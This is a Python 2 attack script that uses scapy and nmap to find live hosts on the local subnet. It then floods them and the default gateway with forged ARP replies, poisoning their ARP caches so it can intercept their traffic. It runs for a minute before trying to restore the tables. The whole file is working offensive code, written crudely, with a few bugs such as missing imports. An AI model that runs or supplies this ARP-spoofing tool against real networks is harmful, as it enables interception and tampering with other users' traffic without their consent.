from multiprocessing import Process
import os
import re
import netifaces as ni
from urllib2 import urlopen
from scapy.all import Dot11,Dot11Beacon,Dot11Elt,sendp,hexdump,Ether,ARP,get_if_hwaddr,getmacbyip
import time
from random import randint
from datetime import datetime
import nmap
conf.verb = 0 #shut the fuck up scapy

if not os.geteuid() == 0:
    sys.exit('Script must be run as root user!')

def get_targets(subnet):
    finlst = []
    raw = nmap.PortScanner().scan(hosts=subnet, arguments='-sn')
    for a, b in raw['scan'].items():
        if str(b['status']['state']) == 'up':
            try:
                finlst.append([str(b['addresses']['ipv4']), str(b['addresses']['mac'])])
            except:
                pass
    return finlst

class Session:      # preparing for implementation of wireless fun & games too
    def __init__(self, pub_ip, gateway, iface = "eth0"):
        self.iface = iface
        self.mac = get_if_hwaddr(self.iface)
        self.pub_ip = pub_ip
        self.gateway = gateway
        self.poison_pid = 0
        self.router_mac = getmacbyip(self.gateway)
        with open("/tmp/fun&games.log", "a") as f:
            f.write("Started a session on ip: " + self.pub_ip + " at " + str(datetime.now()) + "\n")



    def send_poison(self):
        print "Scanning for alive hosts.."
        target = get_targets(str(self.gateway+"/24"))
        print "Done!"
        while True:
            try:
                for i in range(len(target)):
                    pkt = Ether()/ARP(op=2, psrc=self.gateway, pdst=target[i][0], hwdst=target[i][1])
                    pkt.show()
                    sendp(pkt)
                    sendp(Ether()/ARP(op=2, psrc=target[i][0], pdst=self.gateway, hwdst=self.router_mac))
                time.sleep(randint(1,3))
            except:
                print "A major fuckup, can't spam my favorite ARP requests.."
                return(-1)

    def restore_arp_table(self):
        if not self.poison_pid == 0 or not self.poison_pid == None:
            print self.poison_pid
            os.kill(self.poison_pid, 9)
            pkt = Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=self.gateway, hwsrc=self.router_mac)
            sendp(pkt, iface= self.iface, inter=0.2, count=40)
            self.poison_pid = 0
        else:
            print "Not running :/ ..."
        return 0


def get_pub_ip():
    return urlopen('https://ip.42.pl/raw').read()

def get_default_gateway():
    return ni.gateways()['default'][ni.AF_INET][0]

if __name__ == '__main__':
    try:
        attack = Session(get_pub_ip(), get_default_gateway())
    except:
        print "Not connected to any network.."
        sys.exit(-1)

    poison_arp_table = Process(target = attack.send_poison)
    poison_arp_table.start()
    attack.poison_pid = poison_arp_table.pid
    time.sleep(60)
    attack.restore_arp_table()
